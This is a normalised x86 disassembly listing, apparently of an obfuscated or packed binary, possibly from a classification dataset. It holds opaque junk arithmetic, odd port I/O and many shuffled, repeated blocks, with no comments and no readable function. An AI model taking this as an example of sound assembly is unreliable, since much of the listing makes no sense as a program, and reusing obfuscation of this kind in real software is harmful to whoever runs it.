mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4d441
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jae r-xdata
jmp 0xffffffffff79b18e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402e7b
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x739888e7
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
jg 0xffffffff9c948276
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab7ab
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16401c45
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
sub_402e8b
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44f2a2
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c13ecb
jno r-xdata
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afae02
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab7ab
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16401c45
pop edx
jg r-xdata
jpo 0xf70a768
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4d441
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_402eac
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401c45
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fd041
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_402ef7
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16401c45
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcab7ab
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70a768
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_402f2b
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_402f2b
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401c45
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fd041
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_402f76
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f612c
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
ja r-xdata
jge 0x71fc6fd3
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79b18e
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
